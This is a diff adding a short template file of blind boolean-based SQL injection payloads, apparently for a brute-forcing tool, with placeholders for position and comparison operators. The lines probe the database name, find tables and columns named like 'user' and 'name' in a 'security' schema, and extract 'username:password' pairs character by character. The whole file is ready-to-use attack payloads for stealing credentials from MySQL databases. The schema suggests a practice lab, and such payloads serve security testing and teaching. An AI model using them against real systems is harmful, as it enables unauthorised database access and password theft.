@@ -1,0 +1,13 @@
+database length: and {BFP}{OPE}length(database())--+
+database: and {BFP}{OPE}ascii(substring(database(),1,1))--+
+database increase: and {BFP}{OPE}ascii(substring(database(),{INC_1},1))--+
+database stacking brute force: and '{STP}{BFP}'{OPE}left(database(),{INC_1})--+
+
+# important: do not encode {BFP} / {OPE} / {STP} / {INC_x} to url encode
+
+tables like user: and {BFP}{OPE}(select count(table_name) from information_schema.tables where table_schema='security' and table_name like '%user%')
+tables like user: and {BFP}{OPE}ascii(substring((select table_name from information_schema.tables where table_schema='security' and table_name like '%user%' limit 0,1),{INC_1},1))
+
+column name like name: and {BFP}{OPE}ascii(substring((select column_name from information_schema.columns where table_name='users' and column_name like '%name%' limit 0,1),{INC_1},1))
+
+content: and {BFP}{OPE}ascii(substring((select concat(username,':',password) from users limit 0,1),{INC_1},1))
